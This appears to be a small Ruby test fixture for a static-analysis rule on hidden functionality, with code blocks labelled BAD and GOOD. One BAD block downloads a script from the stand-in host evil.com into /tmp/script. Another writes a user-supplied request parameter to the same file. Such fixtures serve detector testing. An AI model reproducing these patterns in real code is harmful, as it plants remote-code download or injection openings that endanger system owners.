require "net/http"

# {fact rule=hidden-functionality@v1.0 defects=1}
resp = Net::HTTP.new("evil.com").get("/script").body
file = File.open("/tmp/script", "w")
file.write(resp) # BAD

# {/fact}

class ExampleController < ActionController::Base
# {fact rule=hidden-functionality@v1.0 defects=1}
    def example
      script = params[:script]
      file = File.open("/tmp/script", "w")
      file.write(script) # BAD
    end
# {/fact}

# {fact rule=hidden-functionality@v1.0 defects=0}
    def example2
      a = "a"
      file = File.open("/tmp/script", "w")
      file.write(a) # GOOD
    end
# {/fact}
end
